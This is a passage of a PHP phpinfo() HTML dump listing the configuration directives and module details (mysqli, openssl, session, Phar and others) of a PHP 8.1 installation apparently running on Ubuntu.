                    <td class="e">fiber.stack_size</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">file_uploads</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">hard_timeout</td>
                    <td class="v">2</td>
                    <td class="v">2</td>
                </tr>
                <tr>
                    <td class="e">highlight.comment</td>
                    <td class="v">
                        <font style="color: #FF8000">#FF8000</font>
                    </td>
                    <td class="v">
                        <font style="color: #FF8000">#FF8000</font>
                    </td>
                </tr>
                <tr>
                    <td class="e">highlight.default</td>
                    <td class="v">
                        <font style="color: #0000BB">#0000BB</font>
                    </td>
                    <td class="v">
                        <font style="color: #0000BB">#0000BB</font>
                    </td>
                </tr>
                <tr>
                    <td class="e">highlight.html</td>
                    <td class="v">
                        <font style="color: #000000">#000000</font>
                    </td>
                    <td class="v">
                        <font style="color: #000000">#000000</font>
                    </td>
                </tr>
                <tr>
                    <td class="e">highlight.keyword</td>
                    <td class="v">
                        <font style="color: #007700">#007700</font>
                    </td>
                    <td class="v">
                        <font style="color: #007700">#007700</font>
                    </td>
                </tr>
                <tr>
                    <td class="e">highlight.string</td>
                    <td class="v">
                        <font style="color: #DD0000">#DD0000</font>
                    </td>
                    <td class="v">
                        <font style="color: #DD0000">#DD0000</font>
                    </td>
                </tr>
                <tr>
                    <td class="e">html_errors</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">ignore_repeated_errors</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">ignore_repeated_source</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">ignore_user_abort</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">implicit_flush</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">include_path</td>
                    <td class="v">.:/usr/share/php</td>
                    <td class="v">.:/usr/share/php</td>
                </tr>
                <tr>
                    <td class="e">input_encoding</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">internal_encoding</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">log_errors</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">mail.add_x_header</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">mail.force_extra_parameters</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">mail.log</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">max_execution_time</td>
                    <td class="v">30</td>
                    <td class="v">30</td>
                </tr>
                <tr>
                    <td class="e">max_file_uploads</td>
                    <td class="v">20</td>
                    <td class="v">20</td>
                </tr>
                <tr>
                    <td class="e">max_input_nesting_level</td>
                    <td class="v">64</td>
                    <td class="v">64</td>
                </tr>
                <tr>
                    <td class="e">max_input_time</td>
                    <td class="v">60</td>
                    <td class="v">60</td>
                </tr>
                <tr>
                    <td class="e">max_input_vars</td>
                    <td class="v">1000</td>
                    <td class="v">1000</td>
                </tr>
                <tr>
                    <td class="e">max_multipart_body_parts</td>
                    <td class="v">-1</td>
                    <td class="v">-1</td>
                </tr>
                <tr>
                    <td class="e">memory_limit</td>
                    <td class="v">128M</td>
                    <td class="v">128M</td>
                </tr>
                <tr>
                    <td class="e">open_basedir</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">output_buffering</td>
                    <td class="v">4096</td>
                    <td class="v">4096</td>
                </tr>
                <tr>
                    <td class="e">output_encoding</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">output_handler</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">post_max_size</td>
                    <td class="v">8M</td>
                    <td class="v">8M</td>
                </tr>
                <tr>
                    <td class="e">precision</td>
                    <td class="v">14</td>
                    <td class="v">14</td>
                </tr>
                <tr>
                    <td class="e">realpath_cache_size</td>
                    <td class="v">4096K</td>
                    <td class="v">4096K</td>
                </tr>
                <tr>
                    <td class="e">realpath_cache_ttl</td>
                    <td class="v">120</td>
                    <td class="v">120</td>
                </tr>
                <tr>
                    <td class="e">register_argc_argv</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">report_memleaks</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">report_zend_debug</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">request_order</td>
                    <td class="v">GP</td>
                    <td class="v">GP</td>
                </tr>
                <tr>
                    <td class="e">sendmail_from</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">sendmail_path</td>
                    <td class="v">/usr/sbin/sendmail &nbsp;-t &nbsp;-i</td>
                    <td class="v">/usr/sbin/sendmail &nbsp;-t &nbsp;-i</td>
                </tr>
                <tr>
                    <td class="e">serialize_precision</td>
                    <td class="v">-1</td>
                    <td class="v">-1</td>
                </tr>
                <tr>
                    <td class="e">short_open_tag</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">SMTP</td>
                    <td class="v">localhost</td>
                    <td class="v">localhost</td>
                </tr>
                <tr>
                    <td class="e">smtp_port</td>
                    <td class="v">25</td>
                    <td class="v">25</td>
                </tr>
                <tr>
                    <td class="e">sys_temp_dir</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">syslog.facility</td>
                    <td class="v">LOG_USER</td>
                    <td class="v">LOG_USER</td>
                </tr>
                <tr>
                    <td class="e">syslog.filter</td>
                    <td class="v">no-ctrl</td>
                    <td class="v">no-ctrl</td>
                </tr>
                <tr>
                    <td class="e">syslog.ident</td>
                    <td class="v">php</td>
                    <td class="v">php</td>
                </tr>
                <tr>
                    <td class="e">unserialize_callback_func</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">upload_max_filesize</td>
                    <td class="v">2M</td>
                    <td class="v">2M</td>
                </tr>
                <tr>
                    <td class="e">upload_tmp_dir</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">user_dir</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">user_ini.cache_ttl</td>
                    <td class="v">300</td>
                    <td class="v">300</td>
                </tr>
                <tr>
                    <td class="e">user_ini.filename</td>
                    <td class="v">.user.ini</td>
                    <td class="v">.user.ini</td>
                </tr>
                <tr>
                    <td class="e">variables_order</td>
                    <td class="v">GPCS</td>
                    <td class="v">GPCS</td>
                </tr>
                <tr>
                    <td class="e">xmlrpc_error_number</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
                <tr>
                    <td class="e">xmlrpc_errors</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">zend.assertions</td>
                    <td class="v">-1</td>
                    <td class="v">-1</td>
                </tr>
                <tr>
                    <td class="e">zend.detect_unicode</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">zend.enable_gc</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">zend.exception_ignore_args</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">zend.exception_string_param_max_len</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
                <tr>
                    <td class="e">zend.multibyte</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">zend.script_encoding</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">zend.signal_check</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
            </table>
            <h2>
                <a name="module_ctype">ctype</a>
            </h2>
            <table>
                <tr>
                    <td class="e">ctype functions </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_date">date</a>
            </h2>
            <table>
                <tr>
                    <td class="e">date/time support </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">timelib version </td>
                    <td class="v">2021.11 </td>
                </tr>
                <tr>
                    <td class="e">&quot;Olson &quot;Timezone Database Version </td>
                    <td class="v">0.system </td>
                </tr>
                <tr>
                    <td class="e">Timezone Database </td>
                    <td class="v">internal </td>
                </tr>
                <tr>
                    <td class="e">Default timezone </td>
                    <td class="v">UTC </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">date.default_latitude</td>
                    <td class="v">31.7667</td>
                    <td class="v">31.7667</td>
                </tr>
                <tr>
                    <td class="e">date.default_longitude</td>
                    <td class="v">35.2333</td>
                    <td class="v">35.2333</td>
                </tr>
                <tr>
                    <td class="e">date.sunrise_zenith</td>
                    <td class="v">90.833333</td>
                    <td class="v">90.833333</td>
                </tr>
                <tr>
                    <td class="e">date.sunset_zenith</td>
                    <td class="v">90.833333</td>
                    <td class="v">90.833333</td>
                </tr>
                <tr>
                    <td class="e">date.timezone</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
            </table>
            <h2>
                <a name="module_exif">exif</a>
            </h2>
            <table>
                <tr>
                    <td class="e">EXIF Support </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">Supported EXIF Version </td>
                    <td class="v">0220 </td>
                </tr>
                <tr>
                    <td class="e">Supported filetypes </td>
                    <td class="v">JPEG, TIFF </td>
                </tr>
                <tr>
                    <td class="e">Multibyte decoding support using mbstring </td>
                    <td class="v">disabled </td>
                </tr>
                <tr>
                    <td class="e">Extended EXIF tag formats </td>
                    <td class="v">Canon, Casio, Fujifilm, Nikon, Olympus, Samsung, Panasonic, DJI, Sony, Pentax, Minolta, Sigma, Foveon, Kyocera, Ricoh, AGFA, Epson </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">exif.decode_jis_intel</td>
                    <td class="v">JIS</td>
                    <td class="v">JIS</td>
                </tr>
                <tr>
                    <td class="e">exif.decode_jis_motorola</td>
                    <td class="v">JIS</td>
                    <td class="v">JIS</td>
                </tr>
                <tr>
                    <td class="e">exif.decode_unicode_intel</td>
                    <td class="v">UCS-2LE</td>
                    <td class="v">UCS-2LE</td>
                </tr>
                <tr>
                    <td class="e">exif.decode_unicode_motorola</td>
                    <td class="v">UCS-2BE</td>
                    <td class="v">UCS-2BE</td>
                </tr>
                <tr>
                    <td class="e">exif.encode_jis</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">exif.encode_unicode</td>
                    <td class="v">ISO-8859-15</td>
                    <td class="v">ISO-8859-15</td>
                </tr>
            </table>
            <h2>
                <a name="module_ffi">FFI</a>
            </h2>
            <table>
                <tr class="h">
                    <th>FFI support</th>
                    <th>enabled</th>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">ffi.enable</td>
                    <td class="v">preload</td>
                    <td class="v">preload</td>
                </tr>
                <tr>
                    <td class="e">ffi.preload</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
            </table>
            <h2>
                <a name="module_fileinfo">fileinfo</a>
            </h2>
            <table>
                <tr>
                    <td class="e">fileinfo support </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">libmagic </td>
                    <td class="v">540 </td>
                </tr>
            </table>
            <h2>
                <a name="module_filter">filter</a>
            </h2>
            <table>
                <tr>
                    <td class="e">Input Validation and Filtering </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">filter.default</td>
                    <td class="v">unsafe_raw</td>
                    <td class="v">unsafe_raw</td>
                </tr>
                <tr>
                    <td class="e">filter.default_flags</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
            </table>
            <h2>
                <a name="module_ftp">ftp</a>
            </h2>
            <table>
                <tr>
                    <td class="e">FTP support </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">FTPS support </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_gettext">gettext</a>
            </h2>
            <table>
                <tr>
                    <td class="e">GetText Support </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_hash">hash</a>
            </h2>
            <table>
                <tr>
                    <td class="e">hash support </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">Hashing Engines </td>
                    <td class="v">md2 md4 md5 sha1 sha224 sha256 sha384 sha512/224 sha512/256 sha512 sha3-224 sha3-256 sha3-384 sha3-512 ripemd128 ripemd160 ripemd256 ripemd320 whirlpool tiger128,3 tiger160,3 tiger192,3 tiger128,4 tiger160,4 tiger192,4 snefru snefru256 gost gost-crypto adler32 crc32 crc32b crc32c fnv132 fnv1a32 fnv164 fnv1a64 joaat murmur3a murmur3c murmur3f xxh32 xxh64 xxh3 xxh128 haval128,3 haval160,3 haval192,3 haval224,3 haval256,3 haval128,4 haval160,4 haval192,4 haval224,4 haval256,4 haval128,5 haval160,5 haval192,5 haval224,5 haval256,5  </td>
                </tr>
            </table>
            <table>
                <tr>
                    <td class="e">MHASH support </td>
                    <td class="v">Enabled </td>
                </tr>
                <tr>
                    <td class="e">MHASH API Version </td>
                    <td class="v">Emulated Support </td>
                </tr>
            </table>
            <h2>
                <a name="module_iconv">iconv</a>
            </h2>
            <table>
                <tr>
                    <td class="e">iconv support </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">iconv implementation </td>
                    <td class="v">glibc </td>
                </tr>
                <tr>
                    <td class="e">iconv library version </td>
                    <td class="v">2.35 </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">iconv.input_encoding</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">iconv.internal_encoding</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">iconv.output_encoding</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
            </table>
            <h2>
                <a name="module_json">json</a>
            </h2>
            <table>
                <tr>
                    <td class="e">json support </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_libxml">libxml</a>
            </h2>
            <table>
                <tr>
                    <td class="e">libXML support </td>
                    <td class="v">active </td>
                </tr>
                <tr>
                    <td class="e">libXML Compiled Version </td>
                    <td class="v">2.9.13 </td>
                </tr>
                <tr>
                    <td class="e">libXML Loaded Version </td>
                    <td class="v">20913 </td>
                </tr>
                <tr>
                    <td class="e">libXML streams </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_mysqli">mysqli</a>
            </h2>
            <table>
                <tr class="h">
                    <th>MysqlI Support</th>
                    <th>enabled</th>
                </tr>
                <tr>
                    <td class="e">Client API library version </td>
                    <td class="v">mysqlnd 8.1.2-1ubuntu2.17 </td>
                </tr>
                <tr>
                    <td class="e">Active Persistent Links </td>
                    <td class="v">0 </td>
                </tr>
                <tr>
                    <td class="e">Inactive Persistent Links </td>
                    <td class="v">0 </td>
                </tr>
                <tr>
                    <td class="e">Active Links </td>
                    <td class="v">0 </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">mysqli.allow_local_infile</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">mysqli.allow_persistent</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">mysqli.default_host</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">mysqli.default_port</td>
                    <td class="v">3306</td>
                    <td class="v">3306</td>
                </tr>
                <tr>
                    <td class="e">mysqli.default_pw</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">mysqli.default_socket</td>
                    <td class="v">/var/run/mysqld/mysqld.sock</td>
                    <td class="v">/var/run/mysqld/mysqld.sock</td>
                </tr>
                <tr>
                    <td class="e">mysqli.default_user</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">mysqli.local_infile_directory</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">mysqli.max_links</td>
                    <td class="v">Unlimited</td>
                    <td class="v">Unlimited</td>
                </tr>
                <tr>
                    <td class="e">mysqli.max_persistent</td>
                    <td class="v">Unlimited</td>
                    <td class="v">Unlimited</td>
                </tr>
                <tr>
                    <td class="e">mysqli.reconnect</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">mysqli.rollback_on_cached_plink</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
            </table>
            <h2>
                <a name="module_mysqlnd">mysqlnd</a>
            </h2>
            <table>
                <tr class="h">
                    <th>mysqlnd</th>
                    <th>enabled</th>
                </tr>
                <tr>
                    <td class="e">Version </td>
                    <td class="v">mysqlnd 8.1.2-1ubuntu2.17 </td>
                </tr>
                <tr>
                    <td class="e">Compression </td>
                    <td class="v">supported </td>
                </tr>
                <tr>
                    <td class="e">core SSL </td>
                    <td class="v">supported </td>
                </tr>
                <tr>
                    <td class="e">extended SSL </td>
                    <td class="v">supported </td>
                </tr>
                <tr>
                    <td class="e">Command buffer size </td>
                    <td class="v">4096 </td>
                </tr>
                <tr>
                    <td class="e">Read buffer size </td>
                    <td class="v">32768 </td>
                </tr>
                <tr>
                    <td class="e">Read timeout </td>
                    <td class="v">86400 </td>
                </tr>
                <tr>
                    <td class="e">Collecting statistics </td>
                    <td class="v">Yes </td>
                </tr>
                <tr>
                    <td class="e">Collecting memory statistics </td>
                    <td class="v">No </td>
                </tr>
                <tr>
                    <td class="e">Tracing </td>
                    <td class="v">n/a </td>
                </tr>
                <tr>
                    <td class="e">Loaded plugins </td>
                    <td class="v">mysqlnd,debug_trace,auth_plugin_mysql_native_password,auth_plugin_mysql_clear_password,auth_plugin_caching_sha2_password,auth_plugin_sha256_password </td>
                </tr>
                <tr>
                    <td class="e">API Extensions </td>
                    <td class="v">mysqli,pdo_mysql </td>
                </tr>
            </table>
            <h2>
                <a name="module_openssl">openssl</a>
            </h2>
            <table>
                <tr>
                    <td class="e">OpenSSL support </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">OpenSSL Library Version </td>
                    <td class="v">OpenSSL 3.0.2 15 Mar 2022 </td>
                </tr>
                <tr>
                    <td class="e">OpenSSL Header Version </td>
                    <td class="v">OpenSSL 3.0.2 15 Mar 2022 </td>
                </tr>
                <tr>
                    <td class="e">Openssl default config </td>
                    <td class="v">/usr/lib/ssl/openssl.cnf </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">openssl.cafile</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">openssl.capath</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
            </table>
            <h2>
                <a name="module_pcre">pcre</a>
            </h2>
            <table>
                <tr>
                    <td class="e">PCRE (Perl Compatible Regular Expressions) Support </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">PCRE Library Version </td>
                    <td class="v">10.39 2021-10-29 </td>
                </tr>
                <tr>
                    <td class="e">PCRE Unicode Version </td>
                    <td class="v">14.0.0 </td>
                </tr>
                <tr>
                    <td class="e">PCRE JIT Support </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">PCRE JIT Target </td>
                    <td class="v">x86 64bit (little endian + unaligned) </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">pcre.backtrack_limit</td>
                    <td class="v">1000000</td>
                    <td class="v">1000000</td>
                </tr>
                <tr>
                    <td class="e">pcre.jit</td>
                    <td class="v">1</td>
                    <td class="v">1</td>
                </tr>
                <tr>
                    <td class="e">pcre.recursion_limit</td>
                    <td class="v">100000</td>
                    <td class="v">100000</td>
                </tr>
            </table>
            <h2>
                <a name="module_pdo">PDO</a>
            </h2>
            <table>
                <tr class="h">
                    <th>PDO support</th>
                    <th>enabled</th>
                </tr>
                <tr>
                    <td class="e">PDO drivers </td>
                    <td class="v">mysql </td>
                </tr>
            </table>
            <h2>
                <a name="module_pdo_mysql">pdo_mysql</a>
            </h2>
            <table>
                <tr class="h">
                    <th>PDO Driver for MySQL</th>
                    <th>enabled</th>
                </tr>
                <tr>
                    <td class="e">Client API version </td>
                    <td class="v">mysqlnd 8.1.2-1ubuntu2.17 </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">pdo_mysql.default_socket</td>
                    <td class="v">/var/run/mysqld/mysqld.sock</td>
                    <td class="v">/var/run/mysqld/mysqld.sock</td>
                </tr>
            </table>
            <h2>
                <a name="module_phar">Phar</a>
            </h2>
            <table>
                <tr class="h">
                    <th>Phar: PHP Archive support</th>
                    <th>enabled</th>
                </tr>
                <tr>
                    <td class="e">Phar API version </td>
                    <td class="v">1.1.1 </td>
                </tr>
                <tr>
                    <td class="e">Phar-based phar archives </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">Tar-based phar archives </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">ZIP-based phar archives </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">gzip compression </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">bzip2 compression </td>
                    <td class="v">disabled (install ext/bz2) </td>
                </tr>
                <tr>
                    <td class="e">Native OpenSSL support </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <table>
                <tr class="v">
                    <td>
                        Phar based on pear/PHP_Archive, original concept by Davey Shafik.<br/>
                        Phar fully realized by Gregory Beaver and Marcus Boerger.<br/>Portions of tar implementation Copyright (c) 2003-2009 Tim Kientzle.
                    </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">phar.cache_list</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">phar.readonly</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">phar.require_hash</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
            </table>
            <h2>
                <a name="module_posix">posix</a>
            </h2>
            <table>
                <tr>
                    <td class="e">POSIX support </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_readline">readline</a>
            </h2>
            <table>
                <tr class="h">
                    <th>Readline Support</th>
                    <th>enabled</th>
                </tr>
                <tr>
                    <td class="e">Readline library </td>
                    <td class="v">EditLine wrapper </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">cli.pager</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">cli.prompt</td>
                    <td class="v">\b &nbsp;\&gt;&nbsp;</td>
                    <td class="v">\b &nbsp;\&gt;&nbsp;</td>
                </tr>
            </table>
            <h2>
                <a name="module_reflection">Reflection</a>
            </h2>
            <table>
                <tr>
                    <td class="e">Reflection </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_session">session</a>
            </h2>
            <table>
                <tr>
                    <td class="e">Session Support </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">Registered save handlers </td>
                    <td class="v">files user  </td>
                </tr>
                <tr>
                    <td class="e">Registered serializer handlers </td>
                    <td class="v">php_serialize php php_binary  </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">session.auto_start</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">session.cache_expire</td>
                    <td class="v">180</td>
                    <td class="v">180</td>
                </tr>
                <tr>
                    <td class="e">session.cache_limiter</td>
                    <td class="v">nocache</td>
                    <td class="v">nocache</td>
                </tr>
                <tr>
                    <td class="e">session.cookie_domain</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">session.cookie_httponly</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">session.cookie_lifetime</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
                <tr>
                    <td class="e">session.cookie_path</td>
                    <td class="v">/</td>
                    <td class="v">/</td>
                </tr>
                <tr>
                    <td class="e">session.cookie_samesite</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">session.cookie_secure</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
                <tr>
                    <td class="e">session.gc_divisor</td>
                    <td class="v">1000</td>
                    <td class="v">1000</td>
                </tr>
                <tr>
                    <td class="e">session.gc_maxlifetime</td>
                    <td class="v">1440</td>
                    <td class="v">1440</td>
                </tr>
                <tr>
                    <td class="e">session.gc_probability</td>
                    <td class="v">0</td>
                    <td class="v">0</td>
                </tr>
                <tr>
                    <td class="e">session.lazy_write</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">session.name</td>
                    <td class="v">PHPSESSID</td>
                    <td class="v">PHPSESSID</td>
                </tr>
                <tr>
                    <td class="e">session.referer_check</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">session.save_handler</td>
                    <td class="v">files</td>
                    <td class="v">files</td>
                </tr>
                <tr>
                    <td class="e">session.save_path</td>
                    <td class="v">/var/lib/php/sessions</td>
                    <td class="v">/var/lib/php/sessions</td>
                </tr>
                <tr>
                    <td class="e">session.serialize_handler</td>
                    <td class="v">php</td>
                    <td class="v">php</td>
                </tr>
                <tr>
                    <td class="e">session.sid_bits_per_character</td>
                    <td class="v">5</td>
                    <td class="v">5</td>
                </tr>
                <tr>
                    <td class="e">session.sid_length</td>
                    <td class="v">26</td>
                    <td class="v">26</td>
                </tr>
                <tr>
                    <td class="e">session.upload_progress.cleanup</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">session.upload_progress.enabled</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">session.upload_progress.freq</td>
                    <td class="v">1%</td>
                    <td class="v">1%</td>
                </tr>
                <tr>
                    <td class="e">session.upload_progress.min_freq</td>
                    <td class="v">1</td>
                    <td class="v">1</td>
                </tr>
                <tr>
                    <td class="e">session.upload_progress.name</td>
